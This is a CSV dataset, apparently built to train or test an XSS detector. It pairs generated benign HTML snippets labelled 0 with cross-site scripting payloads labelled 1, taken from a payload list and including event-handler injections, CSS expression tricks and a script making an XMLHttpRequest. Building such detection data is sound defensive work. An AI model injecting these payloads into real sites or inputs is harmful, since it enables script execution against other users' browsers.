text,label,source,length,timestamp
<span class='class-1214'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",1,payloadbox,65,2026-02-09T15:05:27.723765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.728766
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>,1,payloadbox,63,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.729765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.733766
"<br onmouseover=""alert(1)"">test</br>",1,payloadbox,36,2026-02-09T15:05:27.715767
"<style>@keyframes slidein {}</style><optgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></optgroup>",1,payloadbox,170,2026-02-09T15:05:27.721766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.739765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.741766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.744765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.736778
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.732765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.727768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionend=alert(1)></input>",1,payloadbox,108,2026-02-09T15:05:27.721766
"<keygen onmouseleave=""alert(1)"">test</keygen>",1,payloadbox,45,2026-02-09T15:05:27.718768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.740766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></progress>",1,payloadbox,119,2026-02-09T15:05:27.721766
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1,payloadbox,46,2026-02-09T15:05:27.714766
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",1,payloadbox,96,2026-02-09T15:05:27.725769
"<form onbeforecopy=""alert(1)"" contenteditable>test</form>",1,payloadbox,57,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.741766
"<datalist draggable=""true"" ondragstart=""alert(1)"">test</datalist>",1,payloadbox,65,2026-02-09T15:05:27.715767
"<form onmouseout=""alert(1)"">test</form>",1,payloadbox,39,2026-02-09T15:05:27.717767
"<rt ondblclick=""alert(1)"">test</rt>",1,payloadbox,35,2026-02-09T15:05:27.720768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.737767
"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=alert(1)></address>",1,payloadbox,112,2026-02-09T15:05:27.721766
"<output onclick=""alert(1)"">test</output>",1,payloadbox,40,2026-02-09T15:05:27.719771
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.729765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.726766
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></link>",1,payloadbox,111,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.737767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.733766
<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>,1,payloadbox,80,2026-02-09T15:05:27.716766
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",1,payloadbox,58,2026-02-09T15:05:27.719771
"<address onmouseup=""alert(1)"">test</address>",1,payloadbox,44,2026-02-09T15:05:27.714766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
<form id=x tabindex=1 onfocusin=alert(1)></form>,1,payloadbox,48,2026-02-09T15:05:27.717767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.731765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,1,payloadbox,49,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.740766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.735774
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",1,payloadbox,115,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,1,payloadbox,47,2026-02-09T15:05:27.714766
"<noframes onkeydown=""alert(1)"" contenteditable>test</noframes>",1,payloadbox,62,2026-02-09T15:05:27.719771
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.731765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.727768
"<center onclick=""alert(1)"">test</center>",1,payloadbox,40,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.725769
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.729765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
"<style onkeydown=""alert(1)"" contenteditable>test</style>",1,payloadbox,56,2026-02-09T15:05:27.721766
"<menuitem ondblclick=""alert(1)"">test</menuitem>",1,payloadbox,47,2026-02-09T15:05:27.718768
alert&#x28;1&#x29,1,payloadbox,17,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.729765
"<label onmouseover=""alert(1)"">test</label>",1,payloadbox,42,2026-02-09T15:05:27.718768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.726766
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",1,payloadbox,65,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",1,payloadbox,56,2026-02-09T15:05:27.722765
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,1,payloadbox,54,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",1,payloadbox,105,2026-02-09T15:05:27.716766
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionend=alert(1)></kbd>",1,payloadbox,104,2026-02-09T15:05:27.721766
<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.719771
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.732765
<image srcset=1 onerror=alert(1)>,1,payloadbox,33,2026-02-09T15:05:27.717767
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",1,payloadbox,95,2026-02-09T15:05:27.722765
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,1,payloadbox,59,2026-02-09T15:05:27.719771
<span class='class-124'>Services</span>,0,generated,39,2026-02-09T15:05:27.725769
"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",1,payloadbox,109,2026-02-09T15:05:27.716766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.731765
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",1,payloadbox,107,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,1,payloadbox,78,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.728766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.731765
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",1,payloadbox,109,2026-02-09T15:05:27.721766
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",1,payloadbox,57,2026-02-09T15:05:27.714766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.726766
"<track draggable=""true"" ondragend=""alert(1)"">test</track>",1,payloadbox,57,2026-02-09T15:05:27.723765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",1,payloadbox,166,2026-02-09T15:05:27.721766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.729765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.729765
<span class='class-6324'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
"<select onmousedown=""alert(1)"">test</select>",1,payloadbox,44,2026-02-09T15:05:27.720768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
<div style=xss:expressio\006e(alert(1))>,1,payloadbox,40,2026-02-09T15:05:27.725769
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",1,payloadbox,63,2026-02-09T15:05:27.722765
<span class='class-6404'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.726766
"<img draggable=""true"" ondragend=""alert(1)"">test</img>",1,payloadbox,53,2026-02-09T15:05:27.717767
"<tbody oncontextmenu=""alert(1)"">test</tbody>",1,payloadbox,44,2026-02-09T15:05:27.723765
"<dt oncut=""alert(1)"" contenteditable>test</dt>",1,payloadbox,46,2026-02-09T15:05:27.716766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1,payloadbox,63,2026-02-09T15:05:27.714766
<span class='class-1794'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
"<dialog ondblclick=""alert(1)"">test</dialog>",1,payloadbox,43,2026-02-09T15:05:27.716766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.729765
"<progress onmousemove=""alert(1)"">test</progress>",1,payloadbox,48,2026-02-09T15:05:27.720768
"<area onmouseenter=""alert(1)"">test</area>",1,payloadbox,41,2026-02-09T15:05:27.714766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,1,payloadbox,73,2026-02-09T15:05:27.718768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.726766
"<small onmouseenter=""alert(1)"">test</small>",1,payloadbox,43,2026-02-09T15:05:27.720768
<span class='class-4694'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.734777
<i id=x tabindex=1 onactivate=alert(1)></i>,1,payloadbox,43,2026-02-09T15:05:27.717767
<span class='class-54'>Services</span>,0,generated,38,2026-02-09T15:05:27.725769
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.726766
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",1,payloadbox,61,2026-02-09T15:05:27.720768
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",1,payloadbox,62,2026-02-09T15:05:27.719771
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.733766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
<strike id=x tabindex=1 onfocusin=alert(1)></strike>,1,payloadbox,52,2026-02-09T15:05:27.720768
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.741766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,1,payloadbox,53,2026-02-09T15:05:27.724768
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",1,payloadbox,113,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.732765
<x%2Fonxxx=1,1,payloadbox,12,2026-02-09T15:05:27.713767
"<del onclick=""alert(1)"">test</del>",1,payloadbox,34,2026-02-09T15:05:27.716766
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,1,payloadbox,69,2026-02-09T15:05:27.723765
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",1,payloadbox,99,2026-02-09T15:05:27.722765
"<i onmouseleave=""alert(1)"">test</i>",1,payloadbox,35,2026-02-09T15:05:27.717767
<frameset onpageshow=alert(1)>,1,payloadbox,30,2026-02-09T15:05:27.717767
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",1,payloadbox,105,2026-02-09T15:05:27.716766
<span class='class-1004'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,1,payloadbox,67,2026-02-09T15:05:27.714766
<base id=x tabindex=1 onactivate=alert(1)></base>,1,payloadbox,49,2026-02-09T15:05:27.714766
"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>",1,payloadbox,55,2026-02-09T15:05:27.724768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.726766
"<dt onmouseup=""alert(1)"">test</dt>",1,payloadbox,34,2026-02-09T15:05:27.716766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
<span class='class-3364'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.740766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",1,payloadbox,199,2026-02-09T15:05:27.724768
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",1,payloadbox,160,2026-02-09T15:05:27.722765
<li id=x tabindex=1 onfocus=alert(1)></li>,1,payloadbox,42,2026-02-09T15:05:27.718768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.725769
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",1,payloadbox,58,2026-02-09T15:05:27.720768
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",1,payloadbox,61,2026-02-09T15:05:27.716766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.730765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.732765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.742765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.743765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",1,payloadbox,52,2026-02-09T15:05:27.720768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
"<source onmousemove=""alert(1)"">test</source>",1,payloadbox,44,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",1,payloadbox,162,2026-02-09T15:05:27.721766
"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",1,payloadbox,55,2026-02-09T15:05:27.718768
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",1,payloadbox,103,2026-02-09T15:05:27.716766
"<track onmouseover=""alert(1)"">test</track>",1,payloadbox,42,2026-02-09T15:05:27.723765
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>,1,payloadbox,82,2026-02-09T15:05:27.719771
<span class='class-5364'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
"<progress oncontextmenu=""alert(1)"">test</progress>",1,payloadbox,50,2026-02-09T15:05:27.720768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.742765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
"<meter draggable=""true"" ondrag=""alert(1)"">test</meter>",1,payloadbox,54,2026-02-09T15:05:27.719771
<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>,1,payloadbox,57,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.734777
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.738766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
"<wbr oncontextmenu=""alert(1)"">test</wbr>",1,payloadbox,40,2026-02-09T15:05:27.724768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.731765
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,1,payloadbox,57,2026-02-09T15:05:27.721766
<big id=x tabindex=1 onfocus=alert(1)></big>,1,payloadbox,44,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
"<frame oncopy=""alert(1)"" contenteditable>test</frame>",1,payloadbox,53,2026-02-09T15:05:27.717767
<article id=x tabindex=1 onactivate=alert(1)></article>,1,payloadbox,55,2026-02-09T15:05:27.714766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>",1,payloadbox,107,2026-02-09T15:05:27.716766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.726766
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",1,payloadbox,58,2026-02-09T15:05:27.723765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.726766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.729765
<svg><i onload=alert(1)></i>,1,payloadbox,28,2026-02-09T15:05:27.723765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
<span class='class-3754'>Services</span>,0,generated,40,2026-02-09T15:05:27.736778
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.741766
<script>alert(1)</script>,1,payloadbox,25,2026-02-09T15:05:27.713767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.737767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.736778
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
"<form onmouseover=""alert(1)"">test</form>",1,payloadbox,40,2026-02-09T15:05:27.717767
"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",1,payloadbox,63,2026-02-09T15:05:27.718768
"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",1,payloadbox,55,2026-02-09T15:05:27.716766
"<title onmouseover=""alert(1)"">test</title>",1,payloadbox,42,2026-02-09T15:05:27.723765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.727768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.716766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
"<kbd onmousemove=""alert(1)"">test</kbd>",1,payloadbox,38,2026-02-09T15:05:27.718768
"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",1,payloadbox,53,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
"<nobr onmouseup=""alert(1)"">test</nobr>",1,payloadbox,38,2026-02-09T15:05:27.719771
<link rel=stylesheet href=1 onerror=alert(1)>,1,payloadbox,45,2026-02-09T15:05:27.718768
"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>",1,payloadbox,166,2026-02-09T15:05:27.722765
"<strike onmouseup=""alert(1)"">test</strike>",1,payloadbox,42,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",1,payloadbox,59,2026-02-09T15:05:27.717767
<legend id=x tabindex=1 onfocus=alert(1)></legend>,1,payloadbox,50,2026-02-09T15:05:27.718768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.738766
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",1,payloadbox,99,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.743765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.740766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.742765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.726766
"<details onkeypress=""alert(1)"" contenteditable>test</details>",1,payloadbox,61,2026-02-09T15:05:27.716766
"<br onmousemove=""alert(1)"">test</br>",1,payloadbox,36,2026-02-09T15:05:27.715767
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",1,payloadbox,111,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",1,payloadbox,102,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",1,payloadbox,170,2026-02-09T15:05:27.722765
"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",1,payloadbox,56,2026-02-09T15:05:27.719771
"<ul onmousemove=""alert(1)"">test</ul>",1,payloadbox,36,2026-02-09T15:05:27.724768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.726766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.735774
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.731765
"<span oncontextmenu=""alert(1)"">test</span>",1,payloadbox,42,2026-02-09T15:05:27.720768
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",1,payloadbox,48,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.732765
<p id=x tabindex=1 onactivate=alert(1)></p>,1,payloadbox,43,2026-02-09T15:05:27.719771
"<rb oncut=""alert(1)"" contenteditable>test</rb>",1,payloadbox,46,2026-02-09T15:05:27.720768
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",1,payloadbox,55,2026-02-09T15:05:27.721766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.739765
<header id=x tabindex=1 onfocus=alert(1)></header>,1,payloadbox,50,2026-02-09T15:05:27.717767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",1,payloadbox,107,2026-02-09T15:05:27.721766
"<wbr onmouseup=""alert(1)"">test</wbr>",1,payloadbox,36,2026-02-09T15:05:27.724768
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,1,payloadbox,55,2026-02-09T15:05:27.715767
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",1,payloadbox,62,2026-02-09T15:05:27.715767
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1,payloadbox,99,2026-02-09T15:05:27.722765
<div style=xss:expressio&#x5c;6e(alert(1))>,1,payloadbox,43,2026-02-09T15:05:27.725769
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",1,payloadbox,54,2026-02-09T15:05:27.723765
"<style>:target {color:red;}</style><strike id=x style=""transition:color 1s"" ontransitionend=alert(1)></strike>",1,payloadbox,110,2026-02-09T15:05:27.721766
"<isindex draggable=""true"" ondrag=""alert(1)"">test</isindex>",1,payloadbox,58,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.733766
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",1,payloadbox,87,2026-02-09T15:05:27.722765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
"<meter onmouseleave=""alert(1)"">test</meter>",1,payloadbox,43,2026-02-09T15:05:27.719771
"<q onmouseup=""alert(1)"">test</q>",1,payloadbox,32,2026-02-09T15:05:27.720768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.728766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.727768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.725769
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.719771
"<object onkeyup=""alert(1)"" contenteditable>test</object>",1,payloadbox,56,2026-02-09T15:05:27.719771
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.727768
